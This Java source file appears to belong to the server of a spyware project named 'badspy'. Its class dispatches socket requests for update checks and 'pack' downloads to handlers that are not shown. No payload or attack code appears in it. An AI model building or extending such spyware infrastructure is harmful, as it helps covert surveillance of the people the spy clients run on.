package com.blogspot.sontx.badspy.badserver.bo.bdrworker;

import com.blogspot.sontx.badspy.badserver.bean.SpyDataHeader;
import com.blogspot.sontx.badspy.badserver.bo.Worker;

import java.io.IOException;
import java.net.Socket;

/**
 * Copyright 2016 by sontx
 * Created by sontx on 25/4/2016.
 */
public class BdrWorker extends Worker {
    public static final byte FLAG_YES = 1;
    public static final byte FLAG_NO = 0;

    public BdrWorker(Socket socket) throws IOException {
        super(socket);
    }

    @Override
    protected void processHeader(SpyDataHeader header) throws IOException {
        switch (header.getContentType()) {
            case SpyDataHeader.HEADER_BDR_CHK_UPDATE:
                processCheckUpdateRequest(header.getContentLength());
                break;
            case SpyDataHeader.HEADER_BDR_DWN_PACK:
                processDownloadPackRequest(header.getContentLength());
                break;
        }
    }

    private void processDownloadPackRequest(int contentLength) throws IOException {
        new BdrDownloadPackHandler(reader, writer, contentLength).start();
    }

    private void processCheckUpdateRequest(int contentLength) throws IOException {
        new BdrUpdateReceiver(reader, writer, contentLength).start();
    }
}
